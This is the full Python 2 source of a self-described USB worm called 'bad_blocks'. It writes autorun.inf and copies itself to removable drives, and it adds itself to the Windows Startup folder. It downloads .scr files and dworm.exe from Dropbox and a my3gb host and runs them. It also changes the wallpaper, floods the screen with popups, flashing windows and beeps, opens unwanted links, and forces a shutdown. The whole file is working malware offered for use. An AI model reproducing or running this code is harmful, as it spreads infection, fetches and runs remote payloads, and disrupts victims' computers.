#! python2
#  bad_blocks - (usb-worm)

"""             _____        .__    ________
  ___________  /  |  |  _____|  |__ \_____  \______ 
_/ ___\_  __ \/   |  |_/  ___/  |  \  _(__  <_  __ \
\  \___|  | \/    ^   /\___ \|   Y  \/       \  | \/
 \___  >__|  \____   |/____  >___|  /______  /__|   
     \/           |__|     \/     \/       \/       """


import Tkinter, random, winsound, time, os, ctypes
import getpass, sys, base64, urllib, webbrowser, wget


def us():
    dl = ['F', 'G', 'E', 'M', 'H']
    filen = "\"" + sys.argv[0] + "\""
    autor = '''
[autorun]
;Open=%s
ShellExecute=%s
UseAutoPlay=1''' % (filen, filen)
    try:
        build = open("autorun.inf", 'w')
        build.write(autor)
        build.close()
    except:
        pass

    def cpy(driveLetter):
        if os.system("cd " + driveLetter + ":") == 0:
            os.system("copy " + filen + " " + driveLetter + ":\\")
            try:
                os.system("copy \"autorun.inf\"" + " " + driveLetter + ":\\")
            except:
                pass
        else:
            pass
    for d in range(5):
        try:
            cpy(dl[d])
        except:
            pass


def poo():
    us()
    root = Tkinter.Tk()
    root.title("OOPS!")
    root.geometry("450x350+100+100")
    n1_v2 = random.choice(["http://i.imgur.com/itvNpzx.gif",
                           "http://i.imgur.com/wHNp0Rp.gif",
                           "http://i.imgur.com/KmXgdak.gif",
                           "http://i.imgur.com/nzeIAYZ.gif",
                           "http://i.imgur.com/seCwEkV.gif",
                           "http://i.imgur.com/EPwPjpP.gif",
                           "http://i.imgur.com/Li7Swkp.gif",
                           "http://i.imgur.com/HeBcQpe.gif",
                           "http://i.imgur.com/15Zvi4w.gif",
                           "http://i.imgur.com/oNV1PFv.gif",
                           "http://i.imgur.com/JAbUzsA.gif",
                           "http://i.imgur.com/E4PTe4f.gif",
                           "http://i.imgur.com/sc13tyh.jpg",])
    def callback(event):
        bak = random.choice(["https://www.ashleymadison.com/app/public/index.p",
                       "http://tiny.cc/35ul9x",
                       "http://tiny.cc/nam00",
                       "http://tiny.cc/k6ul9x",
                       "http://tiny.cc/o7ul9x",
                       "http://bit.ly/1T3fjp0",
                       "http://tiny.cc/eavl9x"
                       ])
        webbrowser.open_new(bak)

    link = Tkinter.Label(root, text="CLICK-ME FOR MORE INFO!", fg="RED", cursor="hand2")
    link.pack()
    link.bind("<Button-1>", callback)
    URL = n1_v2
    a = urllib.urlopen(URL)
    raw_input = a.read()
    a.close()
    b = base64.encodestring(raw_input)
    image = Tkinter.PhotoImage(data=b)
    label = Tkinter.Label(image=image)
    label.pack()
    root.mainloop()


def shut():
    hhz = 0
    for w in range(60*30):
        hhz += 1
        time.sleep(1)
        if hhz % 30 == 0:
            us()
        elif hhz == 60*30:
            os.system("shutdown /s")
        else:
            print "hh"
            time.sleep(1)


def block():
    while(1 == 1):
        rn = [i for i in range(1281)]
        rb = [i for i in range(10000)]
        color = ["blue", "red", "cyan", "green", "yellow", "purple", "coral", "pink", "orange"]
        ph = ["bad blocks"]
        block = Tkinter.Tk()
        block.overrideredirect(True)
        tzr = Tkinter.Label(text = ph)
        tzr.pack()

        def uppos():
            z = random.choice(rn)
            a = random.choice(rn)
            ba = random.choice(rb)
            res = "333x333+%s+%s" % (z, a)
            jay = 0
            jay += 1
            if jay == 10:
                us()
                jay -= 10
            block.geometry(res)
            cran = random.choice(color)
            block.configure(background = cran)
            block.after(222, uppos)
            winsound.Beep(ba, 111)

        block.after(111, uppos)
        block.mainloop()


def wpp():

    walph = "C:\\Users\\" + quest + "\\Documents\\fezinho.jpg"
    SPI_SETDESKWALLPAPER = 20
    try:
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, walph , 0)
    except:
        pass


def dn():
    # Necessary files

    global  disf
    disf = "\"C:\Users" + "\\" + quest + "\Documents\""

    urllib.urlretrieve("https://www.dropbox.com/s/t4dlg5khvr190m7/bambams.scr?dl=1", "bambams.scr")
    time.sleep(1)
    os.system("move bambams.scr " + disf)

    urllib.urlretrieve("https://www.dropbox.com/s/mqqsw2s170t45ho/jajas.scr?dl=1", "jajas.scr")
    os.system("move jajas.scr " +  disf)
    time.sleep(1)

    urllib.urlretrieve("https://www.dropbox.com/s/cijstvmp2wf51dc/xavs.scr?dl=1", "xavs.scr")
    os.system("move xavs.scr " + disf)
    time.sleep(1)

    soundbgcode = '''Set Sound = CreateObject("WMPlayer.OCX.7")
Sound.URL = "C:\Users\%s\Documents\\t.mp3"
Sound.Controls.play
do while Sound.currentmedia.duration = 0
wscript.sleep 100
loop
wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
''' % (quest)

    sbgcodew = open("sound.vbs" , 'w')
    sbgcodew.write(soundbgcode)
    sbgcodew.close()

    os.system("move sound.vbs " + disf)
    time.sleep(1)


    urllib.urlretrieve("https://www.dropbox.com/s/369sw5dfiimafgq/t.mp3?dl=1", "t.mp3")
    os.system("move t.mp3 " + disf)
    time.sleep(1)

    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
    os.system("move dworm.exe " + disf)
    time.sleep(1)

    wget.download("http://zepikao.my3gb.com/Sh3lz/fezinho.jpg")
    os.system("move fezinho.jpg " + disf)


def sc():
    global disd
    disd = "C:\Users" + "\\" + quest + "\Documents\\"
    os.system("start " + disd + "dworm.exe")
    us()


def cdefi():
    disf = "\"C:\Users" + "\\" + quest + "\Documents\""
    cdefic = "1"
    sbgcodew3 = open("cdefic.txt" , 'w')
    sbgcodew3.write(cdefic)
    sbgcodew3.close()
    os.system("move cdefic.txt " + disf)


def cdefic():
    try:
        disd = "C:\Users" + "\\" + quest + "\Documents\\"
        a88 = open(disd + "cdefic.txt", 'r')
        if a88.read() == "1":
            return False
    except:
        return True


def checkex():
    us()
    global ft
    global cd
    cd = os.getcwd()
    global quest
    quest = getpass.getuser()
    global startxa
    startxa = "C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    start = "\"C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
    global filen
    filen = "\"" + sys.argv[0] + "\""
    disd = "C:\Users" + "\\" + quest + "\Documents\\"

    if cdefic() == False:
        ft = False
        print ft
        try:
            wpp()
        except:
            pass
        while 1 == 1:
            try:
                pcho = random.choice([1, 2, 3, 4])
                if pcho == 1:
                    us()
                    block()
                elif pcho == 2:
                    for d24 in range(95):
                        if d24 % 7 == 0:
                            us()
                        else:
                            poo()
                    time.sleep(60*7)
                elif pcho == 3:
                    for d34 in range(2):
                        if d34 % 2 == 0:
                            us()
                        else:
                            sc()
                    time.sleep(60*7)
                elif pcho == 4:
                    os.system("start C:\\Users\\%username%\\Documents\\sound.vbs")
                    time.sleep(60*7)
            except:
                pass
    else:
        cdefi()
        ft = True
        startupcom = "copy " + filen + " " + start
        os.system(startupcom)
        try:
            dn()
        except:
            pass
        try:
            wpp()
        except:
            pass
        shut()


checkex()
